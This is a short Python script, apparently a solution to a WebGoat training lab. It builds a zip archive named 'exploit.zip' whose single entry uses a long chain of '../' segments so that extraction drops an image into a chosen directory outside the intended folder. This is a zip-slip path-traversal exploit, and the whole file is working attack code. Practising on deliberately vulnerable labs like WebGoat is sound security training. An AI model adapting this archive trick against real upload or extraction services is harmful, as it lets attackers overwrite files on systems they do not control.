import zipfile

with open("conrad.jpg", "rb") as f:
    data = f.read()

with zipfile.ZipFile("exploit.zip", "w") as z:
    # Path traversal to target location
    z.writestr("../../../../../../../../home/webgoat/.webgoat-2025.3/PathTraversal/conrad/conrad.jpg", data)

